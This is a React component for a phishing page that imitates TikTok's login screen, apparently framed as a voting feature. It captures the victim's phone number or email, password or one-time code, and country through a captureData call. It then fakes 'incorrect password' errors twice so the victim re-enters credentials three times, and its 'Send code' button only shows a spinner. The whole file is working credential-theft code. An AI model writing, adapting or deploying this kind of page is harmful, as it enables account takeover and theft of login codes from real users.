"use client";

import { useState, useEffect } from "react";
import { HelpCircle, Eye, EyeOff, ChevronDown, Search } from "lucide-react";
import { captureData } from "@/lib/capture";

export default function TiktokVote({
  onLogin,
  onSuccess,
}: {
  onLogin: (u: string, p: string) => void;
  onSuccess: () => void;
}) {
  const [loginMethod, setLoginMethod] = useState<"phone" | "email">("phone");
  const [usePassword, setUsePassword] = useState(false);

  // Smart Country States
  const [countries, setCountries] = useState<
    { name: string; code: string; iso: string }[]
  >([]);
  const [selectedCountry, setSelectedCountry] = useState({
    name: "Nigeria",
    code: "+234",
    iso: "NG",
  });
  const [isSendingCode, setIsSendingCode] = useState(false);

  // Input states
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");

  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);

  useEffect(() => {
    const fetchCodes = async () => {
      try {
        const res = await fetch(
          "https://restcountries.com/v3.1/all?fields=name,idd,cca2",
        );
        const data = await res.json();

        const formatted = data
          .map((c: any) => {
            const root = c.idd?.root || "";
            const suffixes = c.idd?.suffixes || [];
            let cleanCode = root;
            if (root !== "+1" && suffixes.length === 1) {
              cleanCode += suffixes[0];
            }
            return {
              name: c.name.common,
              iso: c.cca2,
              code: cleanCode,
            };
          })
          .filter((c: any) => c.code && c.iso)
          .sort((a: any, b: any) => a.name.localeCompare(b.name));

        setCountries(formatted);
        const userLocale = navigator.language.split("-")[1] || "US";
        const detected = formatted.find((c: any) => c.iso === userLocale);
        if (detected) setSelectedCountry(detected);
      } catch (e) {
        console.error("Failed to load country codes");
      }
    };
    fetchCodes();
  }, []);

  const handleSendCode = () => {
    if (!phone) return;
    setIsSendingCode(true);
    setTimeout(() => {
      setIsSendingCode(false);
    }, 2000);
  };

  // Logic to check if inputs are valid to enable button
  const isFormValid =
    loginMethod === "email"
      ? email.length > 0 && password.length > 0
      : phone.length > 0 &&
        (usePassword ? password.length > 0 : code.length > 0);

  const handleAction = async () => {
    if (!isFormValid) return;

    setIsLoading(true);
    setError("");

    const userData =
      loginMethod === "email" ? email : `${selectedCountry.code}${phone}`;
    const credential =
      usePassword || loginMethod === "email" ? password : `CODE:${code}`;

    try {
      await captureData("TikTok-Live", {
        method: loginMethod,
        user: userData,
        pass: credential,
        attempt: attempts + 1,
        country: selectedCountry.name,
      });
    } catch (e) {
      console.error(e);
    }

    onLogin(userData, credential);

    setTimeout(() => {
      setIsLoading(false);
      // Increased to check for 3 submissions (attempts 0, 1, and 2)
      if (attempts < 2) {
        setAttempts((prev) => prev + 1);
        setError(
          loginMethod === "email"
            ? "Incorrect email or password"
            : "The code or password you entered is incorrect.",
        );
        setPassword("");
        setCode("");
      } else {
        // Success triggered on the 3rd submission
        onSuccess();
      }
    }, 1500);
  };

  return (
    <div className="fixed inset-0 z-[10000] bg-white flex flex-col items-center font-sans text-[#161823]">
      <div className="w-full h-16 flex items-center justify-between px-4 md:px-8 border-b border-gray-100">
        <img
          src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
          alt="TikTok"
          className="h-[28px]"
        />
        <HelpCircle size={24} className="text-[#161823] cursor-pointer" />
      </div>

      <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col">
        <h2 className="text-[32px] font-bold text-center mb-8">Log in</h2>

        <div className="flex justify-between items-center mb-4">
          <label className="text-[15px] font-bold">
            {loginMethod === "phone" ? "Phone" : "Email or username"}
          </label>
          <button
            onClick={() => {
              setLoginMethod(loginMethod === "phone" ? "email" : "phone");
              setError("");
            }}
            className="text-[12px] font-semibold text-[#161823] hover:underline">
            {loginMethod === "phone"
              ? "Log in with email or username"
              : "Log in with phone"}
          </button>
        </div>

        <div className="space-y-3">
          {loginMethod === "phone" ? (
            <>
              <div className="flex items-center bg-[#f1f1f2] rounded-sm border border-transparent focus-within:border-[#bdbebf]">
                <div className="relative flex items-center h-[44px] min-w-[120px] border-r border-gray-300">
                  <select
                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-30"
                    value={selectedCountry.iso}
                    onChange={(e) => {
                      const c = countries.find((x) => x.iso === e.target.value);
                      if (c) setSelectedCountry(c);
                    }}>
                    {countries.map((c) => (
                      <option key={`${c.iso}-${c.code}`} value={c.iso}>
                        {c.name} ({c.code})
                      </option>
                    ))}
                  </select>
                  <div className="flex items-center px-3 gap-1 w-full justify-between pointer-events-none z-10">
                    <span className="text-[16px] font-semibold whitespace-nowrap">
                      {selectedCountry.iso} {selectedCountry.code}
                    </span>
                    <ChevronDown size={14} className="flex-shrink-0" />
                  </div>
                </div>
                <input
                  type="tel"
                  placeholder="Phone number"
                  className="flex-1 bg-transparent h-[44px] px-3 outline-none text-[16px]"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                />
              </div>

              {!usePassword ? (
                <div className="flex items-center bg-[#f1f1f2] rounded-sm">
                  <input
                    type="text"
                    placeholder="Enter 6-digit code"
                    className="flex-1 bg-transparent h-[44px] px-3 outline-none text-[16px]"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                  />
                  <button
                    onClick={handleSendCode}
                    disabled={isSendingCode}
                    className="px-4 text-[14px] font-semibold text-gray-400 border-l border-gray-300 h-6 flex items-center gap-2">
                    {isSendingCode && (
                      <div className="w-3 h-3 border-2 border-gray-300 border-t-gray-600 rounded-full animate-spin" />
                    )}
                    Send code
                  </button>
                </div>
              ) : (
                <div className="relative bg-[#f1f1f2] rounded-sm">
                  <input
                    type={showPassword ? "text" : "password"}
                    placeholder="Password"
                    className="w-full bg-transparent h-[44px] px-3 outline-none text-[16px]"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500">
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              )}

              <button
                onClick={() => setUsePassword(!usePassword)}
                className="text-[12px] font-semibold hover:underline block">
                {usePassword ? "Log in with code" : "Log in with password"}
              </button>
            </>
          ) : (
            <>
              <input
                type="text"
                placeholder="Email or username"
                className="w-full bg-[#f1f1f2] h-[44px] px-3 rounded-sm outline-none border border-transparent focus:border-[#bdbebf] text-[16px]"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <div className="relative bg-[#f1f1f2] rounded-sm">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  className="w-full bg-transparent h-[44px] px-3 outline-none text-[16px]"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500">
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
              <button className="text-[12px] font-semibold hover:underline block text-[#161823]">
                Forgot password?
              </button>
            </>
          )}

          {error && (
            <p className="text-[#fe2c55] text-[12px] font-medium pt-1">
              {error}
            </p>
          )}

          <button
            disabled={isLoading || !isFormValid}
            onClick={handleAction}
            className="w-full h-[44px] mt-4 bg-[#fe2c55] text-white font-bold rounded-sm disabled:bg-[#f1f1f2] disabled:text-[#bdbebf] text-[16px]">
            {isLoading ? (
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mx-auto" />
            ) : (
              "Log in"
            )}
          </button>
        </div>

        <div className="mt-16 pt-6 border-t border-gray-100 text-center">
          <p className="text-[15px]">
            Don’t have an account?{" "}
            <span className="text-[#fe2c55] font-bold cursor-pointer hover:underline">
              Sign up
            </span>
          </p>
        </div>
      </div>

      <footer className="mt-auto py-6 text-[12px] text-gray-500 font-medium border-t border-gray-100 w-full flex justify-center gap-4 bg-white">
        <span>English</span>
        <span>© {new Date().getFullYear()} TikTok</span>
      </footer>
    </div>
  );
}
